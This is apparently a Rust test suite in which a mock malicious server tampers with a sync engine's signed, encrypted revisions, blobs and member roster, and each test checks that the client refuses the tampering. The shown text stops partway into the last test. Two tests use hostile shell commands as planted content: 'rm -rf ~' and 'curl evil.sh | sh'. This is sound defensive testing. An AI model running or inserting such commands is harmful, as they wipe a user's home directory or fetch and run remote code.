//! A server that lies. Every test starts from an honest account (the one the
//! web's crypto code built, `sp-crypto/tests/fixtures/account.json`), lets
//! the mock server tamper with one thing, and checks the sync engine refuses
//! it with the right error and leaves this computer's files alone.

use serde::Deserialize;
use serde_json::{Value, json};
use sp_api::Client;
use sp_core::canonical::canonical_json;
use sp_core::{Credentials, Home};
use sp_crypto::pouch::{ManifestEntry, PouchKeys, RevisionBody, RevisionColumns};
use sp_crypto::vault::{
    self, KeyEnvelope, RosterStatement, open_envelopes, open_welcome, verify_roster,
};
use sp_crypto::{CryptoError, EncKey, PublicJwk, SignKey, b64, sealed};
use sp_sync::engine::{self, Options};
use sp_sync::item::PouchDir;
use sp_sync::remote::Remote;
use sp_sync::state::{PouchState, RosterPin};
use sp_sync::{Result as SyncResult, SyncError};
use std::collections::{BTreeMap, HashMap};
use std::sync::{Arc, Mutex, MutexGuard};
use wiremock::matchers::any;
use wiremock::{Mock, MockServer, Request, Respond, ResponseTemplate};

type TestResult<T = ()> = Result<T, Box<dyn std::error::Error>>;

/// A revision for the test to seal.
#[derive(Default)]
struct Revision<'a> {
    artifact_id: &'a str,
    parent: Option<&'a str>,
    merge_parent: Option<&'a str>,
    name: &'a str,
    text: &'a str,
    deleted: bool,
}

/// A new head on top of an item's current one.
#[derive(Default)]
struct Edit<'a> {
    text: &'a str,
    deleted: bool,
    merge_parent: Option<&'a str>,
}

const ROSTER: &str = "skillpouch/v1/roster";
const REVISION: &str = "skillpouch/v1/revision";
const REVISION_SIG: &str = "skillpouch/v1/revision-sig";
const BLOB: &str = "skillpouch/v1/blob";

#[derive(Deserialize)]
struct Fixture {
    account_id: String,
    member_id: String,
    sign_key: String,
    enc_key: String,
    welcome: String,
    roster: Vec<RosterStatement>,
    key_envelopes: Vec<KeyEnvelope>,
}

fn fixture() -> Fixture {
    let text = include_str!("../../sp-crypto/tests/fixtures/account.json");
    serde_json::from_str(text).unwrap_or_else(|e| panic!("bad fixture: {e}"))
}

/// A member key pair the test holds (the fixture's device, or one it adds).
struct Signer {
    id: String,
    sign: SignKey,
    enc: EncKey,
}

impl Signer {
    fn generate() -> Result<Self, CryptoError> {
        Ok(Self {
            id: uuid::Uuid::new_v4().to_string(),
            sign: SignKey::generate()?,
            enc: EncKey::generate()?,
        })
    }

    fn entry(&self, kind: &str) -> Result<Value, CryptoError> {
        Ok(json!({
            "id": self.id,
            "kind": kind,
            "sign_pub": self.sign.public_jwk()?,
            "enc_pub": self.enc.public_jwk()?,
            "key_storage": "file",
        }))
    }
}

/// What the server holds; tests edit it between requests.
#[derive(Default)]
struct World {
    pouch_id: String,
    pouch_key_gen: u32,
    roster: Vec<RosterStatement>,
    envelopes: Vec<KeyEnvelope>,
    artifacts: Vec<Value>,
    blobs: HashMap<String, Vec<u8>>,
    commits: usize,
    fail_commit_on: Option<usize>,
    reject_operations: bool,
    hide_deleted_from_listing: bool,
    duplicate_artifact_page: bool,
    /// Every revision the server keeps, by id, for `GET /revisions`.
    history: HashMap<String, Value>,
    pouch_state: String,
}

const NOW: &str = "2026-10-09T00:00:00.000Z";

impl World {
    /// Applies one operation the way the API does: the head moves only from
    /// the base the operation names.
    fn apply(&mut self, op: &Value) -> Value {
        let head = json!({
            "id": op["revision_id"], "artifact_id": op["artifact_id"],
            "parent_id": op["base_revision_id"], "envelope": op["envelope"],
            "signature": op["signature"], "signer_member_id": op["signer_member_id"],
            "key_gen": op["key_gen"], "blob_ids": op["blob_ids"], "created_at": NOW,
        });
        let applied = json!({
            "status": "applied", "artifact_id": op["artifact_id"],
            "revision_id": op["revision_id"], "seq": 1,
        });
        if op["type"] == "create" {
            if self
                .artifacts
                .iter()
                .any(|artifact| artifact["id"] == op["artifact_id"])
            {
                return json!({
                    "status": "rejected", "artifact_id": op["artifact_id"],
                    "code": "conflict", "message": "artifact already exists",
                });
            }
            self.record(&head);
            self.artifacts.push(json!({
                "id": op["artifact_id"], "deleted_at": null, "updated_at": NOW, "head": head,
            }));
            return applied;
        }
        let Some(artifact) = self
            .artifacts
            .iter_mut()
            .find(|a| a["id"] == op["artifact_id"])
        else {
            return json!({
                "status": "rejected", "artifact_id": op["artifact_id"],
                "code": "not_found", "message": "artifact not found in this pouch",
            });
        };
        if artifact["head"]["id"] != op["base_revision_id"] {
            return json!({
                "status": "conflict", "artifact_id": op["artifact_id"],
                "revision_id": op["revision_id"], "conflict_type": "update_update",
                "server_revision_id": artifact["head"]["id"], "seq": 1,
            });
        }
        artifact["head"] = head.clone();
        artifact["deleted_at"] = if op["type"] == "delete" {
            json!(NOW)
        } else {
            Value::Null
        };
        self.record(&head);
        applied
    }

    fn record(&mut self, revision: &Value) {
        if let Some(id) = revision["id"].as_str() {
            self.history.insert(id.to_string(), revision.clone());
        }
    }
}

#[derive(Clone)]
struct Evil(Arc<Mutex<World>>);

fn ok(data: Value) -> ResponseTemplate {
    ResponseTemplate::new(200).set_body_json(json!({ "ok": true, "data": data, "meta": {} }))
}

impl Respond for Evil {
    fn respond(&self, request: &Request) -> ResponseTemplate {
        let mut world = self.0.lock().unwrap_or_else(|e| e.into_inner());
        let pouch = format!("/v1/pouches/{}", world.pouch_id);
        let path = request.url.path().to_string();
        let route = path.strip_prefix(&pouch).unwrap_or(&path);
        let body = serde_json::from_slice::<Value>(&request.body).unwrap_or_default();
        match (request.method.as_str(), route) {
            ("GET", "/v1/pouches") => ok(json!({ "pouches": [{
                "id": world.pouch_id, "state": world.pouch_state, "event_seq": 1, "created_seq": 1,
                "delete_after": null, "created_at": "2026-10-08T23:50:03.745Z",
                "epoch": "e1", "key_gen": world.pouch_key_gen,
            }]})),
            ("GET", "/v1/account/roster") => ok(json!({
                "head_seq": world.roster.len() as i64 - 1,
                "statements": world.roster,
            })),
            ("GET", "/v1/account/key-envelopes") => ok(json!({ "key_envelopes": world.envelopes })),
            ("GET", "/revisions") => {
                let ids = request
                    .url
                    .query_pairs()
                    .find(|(name, _)| name == "ids")
                    .map(|(_, ids)| ids.into_owned())
                    .unwrap_or_default();
                let revisions: Vec<Value> = ids
                    .split(',')
                    .filter_map(|id| world.history.get(id).cloned())
                    .collect();
                ok(json!({ "revisions": revisions }))
            }
            ("GET", "/artifacts") => {
                let items: Vec<Value> = world
                    .artifacts
                    .iter()
                    .filter(|item| !world.hide_deleted_from_listing || item["deleted_at"].is_null())
                    .cloned()
                    .collect();
                if world.duplicate_artifact_page {
                    if request.url.as_str().contains("cursor=page2") {
                        return ok(
                            json!({ "items": items.first().cloned().into_iter().collect::<Vec<_>>() }),
                        );
                    }
                    return ResponseTemplate::new(200).set_body_json(json!({
                        "ok": true,
                        "data": { "items": items },
                        "meta": { "next_cursor": "page2" },
                    }));
                }
                ok(json!({ "items": items }))
            }
            ("POST", "/blobs/fetch") => {
                let ids: Vec<String> = serde_json::from_slice::<Value>(&request.body)
                    .ok()
                    .and_then(|body| serde_json::from_value(body["ids"].clone()).ok())
                    .unwrap_or_default();
                let mut framed = Vec::new();
                for id in ids {
                    if let (Some(raw), Some(bytes)) = (b64::decode(&id), world.blobs.get(&id)) {
                        framed.extend_from_slice(&raw);
                        framed.extend_from_slice(&(bytes.len() as u32).to_be_bytes());
                        framed.extend_from_slice(bytes);
                    }
                }
                ResponseTemplate::new(200)
                    .insert_header("Content-Type", "application/octet-stream")
                    .set_body_bytes(framed)
            }
            ("POST", "/blobs/check") => {
                let missing: Vec<&Value> = body["blobs"]
                    .as_array()
                    .into_iter()
                    .flatten()
                    .map(|blob| &blob["id"])
                    .filter(|id| !world.blobs.contains_key(id.as_str().unwrap_or_default()))
                    .collect();
                ok(json!({ "missing": missing }))
            }
            ("POST", "/blobs/batch") => {
                // `id(32) ‖ hash(32) ‖ u32_be(len) ‖ bytes`, repeated.
                let mut rest: &[u8] = &request.body;
                while rest.len() >= 68 {
                    let len = u32::from_be_bytes([rest[64], rest[65], rest[66], rest[67]]) as usize;
                    let id = b64::encode(&rest[..32]);
                    world.blobs.insert(id, rest[68..68 + len].to_vec());
                    rest = &rest[68 + len..];
                }
                ok(json!({}))
            }
            ("POST", "/operations") => {
                world.commits += 1;
                if world.fail_commit_on == Some(world.commits) {
                    return ResponseTemplate::new(503).set_body_json(json!({
                        "ok": false,
                        "error": { "code": "unavailable", "message": "injected failure", "retryable": true },
                    }));
                }
                if world.reject_operations {
                    // Reject updates without applying them, as the API can for
                    // an operation-level validation failure.
                    let results: Vec<Value> = body["ops"]
                        .as_array()
                        .into_iter()
                        .flatten()
                        .map(|op| {
                            json!({
                                "status": "rejected", "artifact_id": op["artifact_id"],
                                "code": "rejected", "message": "injected rejection",
                            })
                        })
                        .collect();
                    return ok(json!({ "results": results, "high_water": 1 }));
                }
                let results: Vec<Value> = body["ops"]
                    .as_array()
                    .into_iter()
                    .flatten()
                    .map(|op| world.apply(op))
                    .collect();
                ok(json!({ "results": results, "high_water": 1 }))
            }
            _ => ResponseTemplate::new(404).set_body_json(json!({
                "ok": false,
                "error": { "code": "not_found", "message": path, "retryable": false },
            })),
        }
    }
}

/// The honest account, the server pretending to hold it, and this computer.
struct Harness {
    world: Arc<Mutex<World>>,
    _server: MockServer,
    client: Client,
    credentials: Credentials,
    device: Signer,
    account_id: String,
    pouch_id: String,
    /// `PS_g ‖ PIS` per generation of the synced pouch.
    material: BTreeMap<u32, [u8; 64]>,
    keys: PouchKeys,
    _dir: tempfile::TempDir,
    home: Home,
    pouch_dir: PouchDir,
}

impl Harness {
    async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let fixture = fixture();
        let enc = EncKey::from_b64(&fixture.enc_key)?;
        let welcome = open_welcome(&enc, &fixture.member_id, &fixture.welcome)?;
        let roster = verify_roster(&fixture.roster, &welcome)?;
        let mut pouch_ids: Vec<&String> = roster.pouches.keys().collect();
        pouch_ids.sort();
        let pouch_id = pouch_ids[0].clone();
        let opened = open_envelopes(&roster, &fixture.key_envelopes, &fixture.member_id, &enc)?;
        let material: BTreeMap<u32, [u8; 64]> = opened
            .into_iter()
            .filter(|((id, _), _)| *id == pouch_id)
            .map(|((_, key_gen), material)| (key_gen, material))
            .collect();
        let keys = PouchKeys::new(
            &pouch_id,
            &material.iter().map(|(g, m)| (*g, *m)).collect::<Vec<_>>(),
        )?;

        let world = Arc::new(Mutex::new(World {
            pouch_id: pouch_id.clone(),
            pouch_key_gen: keys.key_gen(),
            roster: fixture.roster.clone(),
            envelopes: fixture.key_envelopes.clone(),
            pouch_state: "active".into(),
            ..World::default()
        }));
        let server = MockServer::start().await;
        Mock::given(any())
            .respond_with(Evil(world.clone()))
            .mount(&server)
            .await;
        let client = Client::new(&server.uri(), "skillpouch-test")?;
        let credentials = Credentials {
            format: Credentials::FORMAT,
            api_url: server.uri(),
            device_id: uuid::Uuid::new_v4().to_string(),
            storage_account_id: fixture.account_id.clone(),
            sign_key: fixture.sign_key.clone(),
            enc_key: fixture.enc_key.clone(),
            refresh_token: "r".into(),
            access_token: "a".into(),
            access_expires_at: u64::MAX,
            welcome: fixture.welcome.clone(),
            member_id: Some(fixture.member_id.clone()),
        };
        let dir = tempfile::tempdir()?;
        let home = Home::new(dir.path().join("home"));
        let pouch_dir = PouchDir::new(dir.path().join("pouch"));
        Ok(Self {
            world,
            _server: server,
            client,
            device: Signer {
                id: fixture.member_id,
                sign: SignKey::from_b64(&fixture.sign_key)?,
                enc,
            },
            credentials,
            account_id: fixture.account_id,
            pouch_id,
            material,
            keys,
            _dir: dir,
            home,
            pouch_dir,
        })
    }

    fn world(&self) -> MutexGuard<'_, World> {
        self.world.lock().unwrap_or_else(|e| e.into_inner())
    }

    fn device_key(&self) -> Result<SignKey, CryptoError> {
        SignKey::from_b64(&self.credentials.sign_key)
    }

    async fn open<'s>(&'s self, key: &'s SignKey) -> SyncResult<Remote<'s>> {
        Remote::open(
            &self.client,
            key,
            "a",
            &self.credentials,
            &self.pouch_id,
            &self.home,
        )
        .await
    }

    /// Opens the pouch and syncs it once into the test folder.
    async fn sync(&self) -> SyncResult<engine::Outcome> {
        let key = self.device_key()?;
        let remote = self.open(&key).await?;
        let mut state = PouchState::load(&self.home, &self.pouch_id)?;
        let outcome = engine::sync_with_checkpoint(
            &remote,
            &self.pouch_dir,
            &mut state,
            Options::default(),
            |state| state.save(&self.home, &self.pouch_id),
        )
        .await;
        state.save(&self.home, &self.pouch_id)?;
        outcome
    }

    fn head_hash(&self) -> String {
        let world = self.world();
        world
            .roster
            .last()
            .map(|s| s.statement_hash.clone())
            .unwrap_or_default()
    }

    /// Signs the next roster statement as `signer` and appends it.
    fn append(&self, signer: &Signer, fields: Value) -> RosterStatement {
        let statement = self.statement(signer, fields);
        self.world().roster.push(statement.clone());
        statement
    }

    fn statement(&self, signer: &Signer, fields: Value) -> RosterStatement {
        let world = self.world();
        let seq = world.roster.len() as u64;
        let mut body = json!({
            "format": 1,
            "account_id": self.account_id,
            "seq": seq,
            "prev_hash": world.roster.last().map(|s| s.statement_hash.clone()),
            "created_at": "2026-10-09T00:00:00.000Z",
            "signer_member_id": signer.id,
        });
        if let (Some(body), Some(fields)) = (body.as_object_mut(), fields.as_object()) {
            body.extend(fields.clone());
        }
        let bytes = canonical_json(&body).into_bytes();
        RosterStatement {
            seq,
            statement: b64::encode(&bytes),
            statement_hash: b64::encode(blake3::hash(&bytes).as_bytes()),
            signature: signer.sign.sign(ROSTER, &bytes),
        }
    }

    /// Adds `member` to the roster, signed by this computer.
    fn add_member(&self, member: &Signer, kind: &str) -> Result<(), CryptoError> {
        let entry = member.entry(kind)?;
        self.append(&self.device, json!({ "action": "add", "member": entry }));
        Ok(())
    }

    /// A revision sealed and signed like a real client would, its blob
    /// stored; returned as the API lists a head.
    fn revision(&self, author: &Signer, of: Revision<'_>) -> Result<Value, CryptoError> {
        let blob = self.keys.seal_blob(of.text.as_bytes())?;
        let body = RevisionBody {
            format: 1,
            artifact_id: of.artifact_id.into(),
            revision_id: uuid::Uuid::new_v4().to_string(),
            parent_id: of.parent.map(str::to_string),
            merge_parent_id: of.merge_parent.map(str::to_string),
            kind: "skill".into(),
            scope: "global".into(),
            logical_key: of.name.into(),
            deleted: of.deleted,
            entries: vec![ManifestEntry {
                path: "SKILL.md".into(),
                blob: blob.id.clone(),
                size: blob.size,
                mode: "file".into(),
            }],
            roster_head: self.head_hash(),
            author_member_id: author.id.clone(),
            created_at: NOW.into(),
        };
        let revision = self.keys.seal_revision(&author.sign, &body)?;
        self.world().blobs.insert(blob.id.clone(), blob.bytes);
        let head = json!({
            "id": body.revision_id,
            "artifact_id": of.artifact_id,
            "parent_id": of.parent,
            "merge_parent_id": of.merge_parent,
            "envelope": revision.envelope,
            "signature": revision.signature,
            "signer_member_id": author.id,
            "key_gen": revision.key_gen,
            "blob_ids": [blob.id],
            "created_at": NOW,
        });
        self.world()
            .history
            .insert(body.revision_id.clone(), head.clone());
        Ok(head)
    }

    /// An item whose head is sealed and signed like a real client would.
    fn put_item(&self, author: &Signer, name: &str, text: &str) -> Result<String, CryptoError> {
        let artifact_id = uuid::Uuid::new_v4().to_string();
        let head = self.revision(
            author,
            Revision {
                artifact_id: &artifact_id,
                name,
                text,
                ..Revision::default()
            },
        )?;
        self.world().artifacts.push(json!({
            "id": artifact_id,
            "deleted_at": null,
            "updated_at": NOW,
            "head": head,
        }));
        Ok(artifact_id)
    }

    /// Someone moves the item to a new head on top of the current one, as
    /// the API would after a signed write; returns the replaced head.
    fn edit(&self, author: &Signer, artifact_id: &str, edit: Edit<'_>) -> TestResult<Value> {
        let current = Harness::head_mut(&mut self.world(), artifact_id).clone();
        let parent = current["id"].as_str().unwrap_or_default().to_string();
        let name = self.name_of(&current)?;
        let head = self.revision(
            author,
            Revision {
                artifact_id,
                parent: Some(&parent),
                merge_parent: edit.merge_parent,
                name: &name,
                text: edit.text,
                deleted: edit.deleted,
            },
        )?;
        let mut world = self.world();
        let artifact = world
            .artifacts
            .iter_mut()
            .find(|a| a["id"] == artifact_id)
            .ok_or("no artifact")?;
        artifact["head"] = head;
        artifact["deleted_at"] = if edit.deleted {
            json!(NOW)
        } else {
            Value::Null
        };
        Ok(current)
    }

    /// The decrypted body of a head as listed.
    fn open_listed(&self, head: &Value) -> TestResult<RevisionBody> {
        let text = |field: &str| head[field].as_str().unwrap_or_default().to_string();
        let signer = text("signer_member_id");
        let welcome = open_welcome(&self.device.enc, &self.device.id, &self.credentials.welcome)?;
        let roster = verify_roster(&self.world().roster, &welcome)?;
        let sign_pub = roster
            .members
            .get(&signer)
            .ok_or("unknown signer")?
            .sign_pub
            .clone();
        let parent = head["parent_id"].as_str();
        Ok(self.keys.open_revision(
            &RevisionColumns {
                artifact_id: &text("artifact_id"),
                revision_id: &text("id"),
                parent_id: parent,
                envelope: &text("envelope"),
                signature: &text("signature"),
                signer_member_id: &signer,
            },
            &sign_pub,
        )?)
    }

    fn name_of(&self, head: &Value) -> TestResult<String> {
        Ok(self.open_listed(head)?.logical_key)
    }

    fn head_mut<'w>(world: &'w mut World, artifact_id: &str) -> &'w mut Value {
        world
            .artifacts
            .iter_mut()
            .find(|a| a["id"] == artifact_id)
            .map(|a| &mut a["head"])
            .unwrap_or_else(|| panic!("no artifact {artifact_id}"))
    }

    fn skill_on_disk(&self, name: &str) -> Option<String> {
        std::fs::read_to_string(
            self.pouch_dir
                .root()
                .join("skills")
                .join(name)
                .join("SKILL.md"),
        )
        .ok()
    }

    /// `K_content` of generation `key_gen`, as only a member could derive it.
    fn content_key(&self, key_gen: u32) -> [u8; 32] {
        blake3::derive_key("skillpouch/v1/content", &self.material[&key_gen][..32])
    }
}

fn flip(text: &str, at: usize) -> String {
    let mut bytes = b64::decode(text).unwrap_or_default();
    let at = at.min(bytes.len() - 1);
    bytes[at] ^= 0x01;
    b64::encode(&bytes)
}

fn is_crypto(error: &SyncError, check: impl Fn(&CryptoError) -> bool) -> bool {
    matches!(error, SyncError::Crypto(inner) if check(inner))
}

fn expect_roster(error: &SyncError, needle: &str) {
    assert!(
        is_crypto(
            error,
            |e| matches!(e, CryptoError::Roster(m) if m.contains(needle))
        ),
        "expected roster error with {needle:?}, got {error:?}"
    );
}

fn expect_signature(error: &SyncError) {
    assert!(
        is_crypto(error, |e| matches!(e, CryptoError::Signature(_))),
        "expected a signature error, got {error:?}"
    );
}

// ---- the honest baseline -------------------------------------------------------------

#[tokio::test]
async fn an_honest_server_syncs() -> TestResult {
    let h = Harness::new().await?;
    h.put_item(&h.device, "pdf", "# PDF\n")?;
    let outcome = h.sync().await?;
    assert_eq!((outcome.received, outcome.unreadable), (1, 0));
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# PDF\n"));
    // The newest roster verified is pinned.
    let pin = RosterPin::load(&h.home)?.ok_or("no pin")?;
    assert_eq!(pin.head_seq, 7);
    Ok(())
}

// ---- blobs ---------------------------------------------------------------------------

#[tokio::test]
async fn a_bit_flipped_blob_fails_authentication_and_writes_nothing() -> TestResult {
    let h = Harness::new().await?;
    h.put_item(&h.device, "pdf", "# PDF\n")?;
    for blob in h.world().blobs.values_mut() {
        let last = blob.len() - 1;
        blob[last] ^= 0x80;
    }
    let error = h.sync().await.err().ok_or("accepted a flipped blob")?;
    assert!(
        is_crypto(&error, |e| matches!(e, CryptoError::Aead)),
        "{error:?}"
    );
    assert_eq!(h.skill_on_disk("pdf"), None);
    Ok(())
}

#[tokio::test]
async fn a_blob_served_under_another_id_is_refused() -> TestResult {
    let h = Harness::new().await?;
    h.put_item(&h.device, "a", "first\n")?;
    h.put_item(&h.device, "b", "second\n")?;
    {
        let mut world = h.world();
        let ids: Vec<String> = world.blobs.keys().cloned().collect();
        let (x, y) = (world.blobs[&ids[0]].clone(), world.blobs[&ids[1]].clone());
        world.blobs.insert(ids[0].clone(), y);
        world.blobs.insert(ids[1].clone(), x);
    }
    let error = h.sync().await.err().ok_or("accepted swapped blobs")?;
    assert!(
        is_crypto(&error, |e| matches!(e, CryptoError::Aead)),
        "{error:?}"
    );
    assert_eq!(h.skill_on_disk("a"), None);
    assert_eq!(h.skill_on_disk("b"), None);
    Ok(())
}

#[tokio::test]
async fn blob_content_that_does_not_match_its_keyed_id_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    {
        // Sealed by someone holding the keys, but under the id of other content.
        let mut world = h.world();
        let id = Harness::head_mut(&mut world, &artifact)["blob_ids"][0]
            .as_str()
            .unwrap_or_default()
            .to_string();
        let aad = [
            BLOB.as_bytes(),
            h.pouch_id.as_bytes(),
            &b64::decode(&id).unwrap_or_default(),
        ]
        .concat();
        let key_gen = h.keys.key_gen();
        let forged = sealed::seal(&h.content_key(key_gen), key_gen, b"rm -rf ~\n", &aad)?;
        world.blobs.insert(id, forged);
    }
    let error = h.sync().await.err().ok_or("accepted a mislabelled blob")?;
    assert!(
        is_crypto(
            &error,
            |e| matches!(e, CryptoError::Format(m) if m.contains("does not match its id"))
        ),
        "{error:?}"
    );
    assert_eq!(h.skill_on_disk("pdf"), None);
    Ok(())
}

// ---- revisions -----------------------------------------------------------------------

/// Syncs `pdf` honestly, lets the server tamper with its head, syncs again:
/// the item is unreadable and this computer's copy stays as it was.
async fn tampered_head_is_held(tamper: impl FnOnce(&Harness, &mut Value)) -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    h.sync().await?;
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# PDF\n"));
    {
        let mut world = h.world();
        let head = Harness::head_mut(&mut world, &artifact);
        tamper(&h, head);
    }
    let outcome = h.sync().await?;
    assert_eq!(outcome.unreadable, 1);
    assert_eq!((outcome.sent, outcome.received), (0, 0));
    assert_eq!(
        h.skill_on_disk("pdf").as_deref(),
        Some("# PDF\n"),
        "local copy changed"
    );
    assert_eq!(h.world().commits, 0, "sent something about a tampered item");
    let state = PouchState::load(&h.home, &h.pouch_id)?;
    assert!(state.items.contains_key("skill/pdf"), "forgot the item");
    Ok(())
}

#[tokio::test]
async fn a_revision_with_a_flipped_signature_is_refused_and_nothing_is_deleted() -> TestResult {
    tampered_head_is_held(|_, head| {
        head["signature"] = json!(flip(head["signature"].as_str().unwrap_or_default(), 10));
    })
    .await
}

#[tokio::test]
async fn a_revision_with_a_flipped_envelope_is_refused() -> TestResult {
    tampered_head_is_held(|_, head| {
        head["envelope"] = json!(flip(head["envelope"].as_str().unwrap_or_default(), 40));
    })
    .await
}

#[tokio::test]
async fn a_revision_signed_by_a_stranger_is_refused() -> TestResult {
    tampered_head_is_held(|h, head| {
        // Same bytes, re-signed by a key that is not in the roster.
        let stranger = SignKey::generate().unwrap_or_else(|e| panic!("{e}"));
        let envelope =
            b64::decode(head["envelope"].as_str().unwrap_or_default()).unwrap_or_default();
        let id = head["id"].as_str().unwrap_or_default().to_string();
        let message = [
            h.pouch_id.as_bytes(),
            id.as_bytes(),
            blake3::hash(&envelope).as_bytes(),
        ]
        .concat();
        head["signature"] = json!(stranger.sign(REVISION_SIG, &message));
    })
    .await
}

#[tokio::test]
async fn a_revision_claimed_by_an_unknown_member_is_refused() -> TestResult {
    tampered_head_is_held(|_, head| {
        head["signer_member_id"] = json!(uuid::Uuid::new_v4().to_string());
    })
    .await
}

#[tokio::test]
async fn a_re_parented_revision_is_refused() -> TestResult {
    tampered_head_is_held(|_, head| {
        head["parent_id"] = json!(uuid::Uuid::new_v4().to_string());
    })
    .await
}

#[tokio::test]
async fn an_envelope_moved_to_another_artifact_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let a = h.put_item(&h.device, "a", "A\n")?;
    let b = h.put_item(&h.device, "b", "B\n")?;
    {
        let mut world = h.world();
        let from = Harness::head_mut(&mut world, &a).clone();
        let head = Harness::head_mut(&mut world, &b);
        head["envelope"] = from["envelope"].clone();
        head["signature"] = from["signature"].clone();
    }
    let outcome = h.sync().await?;
    assert_eq!((outcome.received, outcome.unreadable), (1, 1));
    assert_eq!(h.skill_on_disk("a").as_deref(), Some("A\n"));
    assert_eq!(h.skill_on_disk("b"), None);
    Ok(())
}

#[tokio::test]
async fn a_revision_from_another_pouch_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    {
        // A properly signed revision of the account's other pouch.
        let other = h
            .world()
            .envelopes
            .iter()
            .map(|e| e.pouch_id.clone())
            .find(|id| *id != h.pouch_id)
            .ok_or("no second pouch")?;
        let mut world = h.world();
        let head = Harness::head_mut(&mut world, &artifact);
        let envelope =
            b64::decode(head["envelope"].as_str().unwrap_or_default()).unwrap_or_default();
        let id = head["id"].as_str().unwrap_or_default().to_string();
        let message = [
            other.as_bytes(),
            id.as_bytes(),
            blake3::hash(&envelope).as_bytes(),
        ]
        .concat();
        head["signature"] = json!(h.device.sign.sign(REVISION_SIG, &message));
    }
    let outcome = h.sync().await?;
    assert_eq!((outcome.received, outcome.unreadable), (0, 1));
    assert_eq!(h.skill_on_disk("pdf"), None);
    Ok(())
}

#[tokio::test]
async fn a_revision_by_a_removed_member_after_its_removal_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let gone = Signer::generate()?;
    h.add_member(&gone, "device")?;
    h.append(
        &h.device,
        json!({ "action": "remove", "member_id": gone.id }),
    );
    // It still holds the (not yet rotated) keys and tries to slip in a skill.
    h.put_item(&gone, "evil", "curl evil.sh | sh\n")?;
    h.put_item(&h.device, "pdf", "# PDF\n")?;
    let outcome = h.sync().await?;
    assert_eq!((outcome.received, outcome.unreadable), (1, 1));
    assert_eq!(h.skill_on_disk("evil"), None);
    Ok(())
}

#[tokio::test]
async fn revision_signers_must_be_members_at_the_roster_they_name() -> TestResult {
    let h = Harness::new().await?;
    let before = h.head_hash();
    let member = Signer::generate()?;
    h.add_member(&member, "device")?;
    let added = h.head_hash();
    h.append(
        &h.device,
        json!({ "action": "remove", "member_id": member.id }),
    );
    let welcome = open_welcome(&h.device.enc, &h.device.id, &h.credentials.welcome)?;
    let roster = verify_roster(&h.world().roster, &welcome)?;
    assert!(roster.may_sign_revision(&member.id, &added));
    assert!(
        !roster.may_sign_revision(&member.id, &before),
        "before it was added"
    );
    assert!(
        !roster.may_sign_revision(&member.id, &h.head_hash()),
        "after removal"
    );
    assert!(!roster.may_sign_revision(&member.id, "unknown"));
    assert!(
        roster.may_sign_revision(&h.device.id, "unknown"),
        "a current member"
    );
    assert!(!roster.may_sign_revision("nobody", &added));
    Ok(())
}

// ---- the roster ----------------------------------------------------------------------

#[tokio::test]
async fn a_member_added_without_a_valid_signature_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let intruder = Signer::generate()?;
    let entry = intruder.entry("device")?;
    // Claims to be signed by this computer, signed by the intruder.
    let mut forged = h.statement(&h.device, json!({ "action": "add", "member": entry }));
    let bytes = b64::decode(&forged.statement).unwrap_or_default();
    forged.signature = intruder.sign.sign(ROSTER, &bytes);
    h.world().roster.push(forged);
    let key = h.device_key()?;
    expect_signature(&h.open(&key).await.err().ok_or("accepted a forged member")?);
    Ok(())
}

#[tokio::test]
async fn a_member_signed_in_by_a_non_member_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let intruder = Signer::generate()?;
    let entry = intruder.entry("device")?;
    h.append(&intruder, json!({ "action": "add", "member": entry }));
    let key = h.device_key()?;
    expect_signature(
        &h.open(&key)
            .await
            .err()
            .ok_or("accepted a self-signed member")?,
    );
    Ok(())
}

#[tokio::test]
async fn an_edited_statement_is_refused() -> TestResult {
    let h = Harness::new().await?;
    {
        let mut world = h.world();
        let statement = &mut world.roster[3];
        statement.statement = flip(&statement.statement, 30);
    }
    let key = h.device_key()?;
    let error = h
        .open(&key)
        .await
        .err()
        .ok_or("accepted an edited statement")?;
    assert!(
        is_crypto(&error, |e| matches!(e, CryptoError::Roster(_))),
        "{error:?}"
    );
    Ok(())
}

#[tokio::test]
async fn reordered_or_replayed_statements_are_refused() -> TestResult {
    let h = Harness::new().await?;
    let honest = h.world().roster.clone();
    let key = h.device_key()?;

    let mut reordered = honest.clone();
    reordered.swap(5, 6);
    let (a, b) = (reordered[5].seq, reordered[6].seq);
    reordered[5].seq = b;
    reordered[6].seq = a;
    h.world().roster = reordered;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("accepted a reordered roster")?,
        "",
    );

    let mut replayed = honest.clone();
    let mut again = honest[4].clone();
    again.seq = 8;
    replayed.push(again);
    h.world().roster = replayed;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("accepted a replayed statement")?,
        "",
    );
    Ok(())
}

#[tokio::test]
async fn a_roster_rolled_back_below_what_this_computer_saw_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let member = Signer::generate()?;
    h.add_member(&member, "device")?;
    h.append(
        &h.device,
        json!({ "action": "remove", "member_id": member.id }),
    );
    let key = h.device_key()?;
    h.open(&key).await?;
    assert_eq!(RosterPin::load(&h.home)?.map(|p| p.head_seq), Some(9));

    // Hide the removal again (the welcome alone only pins seq 7).
    h.world().roster.truncate(9);
    expect_roster(
        &h.open(&key).await.err().ok_or("accepted a rollback")?,
        "went backwards",
    );
    Ok(())
}

#[tokio::test]
async fn a_forked_roster_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let honest = h.world().roster.clone();
    let key = h.device_key()?;
    h.add_member(&Signer::generate()?, "device")?;
    h.open(&key).await?;

    // Another seq 8 for this computer: same signer, different member.
    h.world().roster = honest;
    h.add_member(&Signer::generate()?, "device")?;
    expect_roster(
        &h.open(&key).await.err().ok_or("accepted a fork")?,
        "changed after this computer saw it",
    );
    Ok(())
}

#[tokio::test]
async fn a_different_genesis_or_another_accounts_roster_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let honest = h.world().roster.clone();
    let key = h.device_key()?;

